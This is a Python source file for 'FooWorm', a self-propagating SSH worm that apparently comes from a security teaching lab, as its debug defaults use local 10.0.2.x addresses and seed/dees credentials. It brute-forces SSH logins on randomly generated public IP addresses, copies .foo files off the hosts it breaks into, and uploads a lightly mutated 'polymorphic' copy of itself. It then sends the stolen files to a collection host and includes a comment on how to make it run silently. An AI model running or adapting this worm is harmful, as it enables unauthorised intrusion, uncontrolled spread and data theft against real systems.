#!/usr/bin/env python

import sys
import os
import random
import paramiko
import scp
import select
import signal
import glob
import tempfile
import string
import traceback
import logging
import argparse

##   You would want to uncomment the following two lines for the worm to 
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

# Setup logging
def setup_logging(log_level):
    """Configure logging with the specified level."""
    numeric_level = getattr(logging, log_level.upper(), None)
    if not isinstance(numeric_level, int):
        raise ValueError(f'Invalid log level: {log_level}')
    
    logging.basicConfig(
        level=numeric_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

# Get module logger
logger = logging.getLogger(__name__)

# Signal handler setup
def sig_handler(signum, frame): os.kill(os.getpid(), signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1
NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x: random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['10.0.2.10', '10.0.2.11']
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='FooWorm - SSH-based worm targeting .foo files')
    parser.add_argument(
        '--log-level',
        default='INFO',
        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
        help='Set the logging level (default: INFO)'
    )
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_arguments()
    setup_logging(args.log_level)
    
    logger.info("FooWorm starting")
    
    while True:
        logger.info("Starting main loop iteration")
        usernames = get_new_usernames(NUSERNAMES)
        passwds = get_new_passwds(NPASSWDS)
        logger.debug(f"Generated usernames: {usernames}")
        logger.debug(f"Generated passwords: {passwds}")
        
        for passwd in passwds:
            for user in usernames:
                for ip_address in get_fresh_ipaddresses(NHOSTS):
                    logger.info(f"Attempting connection: host={ip_address}, user={user}")
                    files_of_interest_at_target = []
                    ssh = None
                    
                    try:
                        logger.debug(f"Creating SSH client for {ip_address}")
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                        logger.info(f"Connected successfully: host={ip_address}, user={user}")
                        
                        # Check if already infected
                        logger.debug(f"Checking infection status: host={ip_address}")
                        stdin, stdout, stderr = ssh.exec_command('ls')
                        error = stderr.readlines()
                        if error:
                            logger.debug(f"Error in ls command: host={ip_address}, error={error}")
                        
                        received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                        logger.debug(f"Directory listing: host={ip_address}, files={len(received_list)}")
                        
                        if ''.join(str(received_list)).find('FooWorm') >= 0:
                            logger.info(f"Target already infected, skipping: host={ip_address}")
                            continue
                        
                        # Find .foo files
                        logger.debug(f"Searching for .foo files: host={ip_address}")
                        cmd = 'ls *.foo 2>/dev/null || echo "No .foo files found"'
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        
                        error = stderr.readlines()
                        if error:
                            logger.debug(f"Error in ls *.foo command: host={ip_address}, error={error}")
                        
                        received_list = list(map(lambda x: x.strip(), stdout.readlines()))
                        
                        if not received_list or 'No .foo files found' in received_list:
                            logger.debug(f"No .foo files found: host={ip_address}")
                            files_of_interest_at_target = []
                        else:
                            files_of_interest_at_target = [f for f in received_list if f and f != 'No .foo files found']
                            logger.info(f"Found .foo files: host={ip_address}, count={len(files_of_interest_at_target)}")
                        
                        logger.debug(f"Files of interest: host={ip_address}, files={files_of_interest_at_target}")
                        
                        # Initialize SCP
                        logger.debug(f"Setting up SCP: host={ip_address}")
                        try:
                            scpcon = scp.SCPClient(ssh.get_transport())
                        except Exception as e:
                            logger.exception(f"SCP setup failed: host={ip_address}")
                            raise
                        
                        # Download .foo files
                        if files_of_interest_at_target:
                            logger.info(f"Downloading .foo files: host={ip_address}, count={len(files_of_interest_at_target)}")
                            for target_file in files_of_interest_at_target:
                                try:
                                    logger.debug(f"Downloading file: host={ip_address}, file={target_file}")
                                    scpcon.get(target_file)
                                    logger.info(f"Downloaded file: host={ip_address}, file={target_file}")
                                except Exception as e:
                                    logger.warning(f"Download failed: host={ip_address}, file={target_file}, error={str(e)}")
                        else:
                            logger.debug(f"No .foo files to download: host={ip_address}")
                        
                        # Create polymorphic worm variant
                        logger.debug(f"Creating polymorphic variant: host={ip_address}")
                        temp_file_path = None
                        try:
                            temp_file = tempfile.NamedTemporaryFile(delete=False)
                            temp_file_path = temp_file.name
                            temp_file.close()
                            
                            logger.debug(f"Created temp file: path={temp_file_path}")
                            
                            with open(sys.argv[0], 'r') as original:
                                content = original.readlines()
                                logger.debug(f"Read original worm: lines={len(content)}")
                            
                            # Modification 1: Add random new lines
                            for i in range(3):
                                random_position = random.randint(0, len(content)-1)
                                content.insert(random_position, "\n")
                            
                            # Modification 2: Add random comments
                            for i in range(2):
                                random_comment = '# ' + ''.join(random.choice(string.ascii_letters) for _ in range(20)) + '\n'
                                random_position = random.randint(0, len(content)-1)
                                content.insert(random_position, random_comment)
                            
                            logger.debug(f"Created modified variant: lines={len(content)}")
                            
                            # Write modified worm
                            with open(temp_file_path, 'w') as modified:
                                modified.writelines(content)
                            
                            # Upload modified worm
                            logger.debug(f"Uploading worm: host={ip_address}")
                            try:
                                scpcon.put(temp_file_path, 'FooWorm.py')
                                logger.info(f"Uploaded worm successfully: host={ip_address}")
                            except Exception as e:
                                logger.exception(f"Upload failed: host={ip_address}")
                                raise
                        except Exception as e:
                            logger.exception(f"Polymorphic variant creation failed: host={ip_address}")
                            raise
                        finally:
                            # GUARANTEED CLEANUP
                            if temp_file_path and os.path.exists(temp_file_path):
                                try:
                                    os.unlink(temp_file_path)
                                    logger.debug(f"Cleaned up temp file: path={temp_file_path}")
                                except OSError as e:
                                    logger.warning(f"Failed to clean up temp file: path={temp_file_path}, error={e}")
                        
                        # Close SCP connection
                        logger.debug(f"Closing SCP: host={ip_address}")
                        scpcon.close()
                        
                        # Close SSH connection
                        logger.debug(f"Closing SSH: host={ip_address}")
                        ssh.close()
                        
                    except Exception as e:
                        logger.exception(f"Connection attempt failed: host={ip_address}, user={user}")
                        if ssh:
                            try:
                                ssh.close()
                            except:
                                pass
                        continue
                    
                    # Exfiltrate files
                    if files_of_interest_at_target:
                        logger.info(f"Starting exfiltration: source_host={ip_address}, files={len(files_of_interest_at_target)}")
                        ssh = None
                        try:
                            logger.debug("Connecting to exfiltration host: host=10.0.2.9")
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            
                            ssh.connect('10.0.2.9', port=22, username='seed', password='dees', timeout=5)
                            
                            scpcon = scp.SCPClient(ssh.get_transport())
                            
                            logger.info("Connected to exfiltration host: host=10.0.2.9")
                            
                            for filename in files_of_interest_at_target:
                                try:
                                    logger.debug(f"Exfiltrating file: file={filename}")
                                    scpcon.put(filename)
                                    logger.info(f"Exfiltrated file: file={filename}")
                                except Exception as e:
                                    logger.warning(f"Exfiltration failed: file={filename}, error={str(e)}")
                            
                            scpcon.close()
                            ssh.close()
                            logger.debug("Closed exfiltration connection: host=10.0.2.9")
                        except Exception as e:
                            logger.exception("Exfiltration connection failed: host=10.0.2.9")
                            if ssh:
                                try:
                                    ssh.close()
                                except:
                                    pass
                            continue
                    else:
                        logger.debug(f"No files to exfiltrate: host={ip_address}")
        
        if debug:
            logger.info("Debug mode - exiting main loop")
            break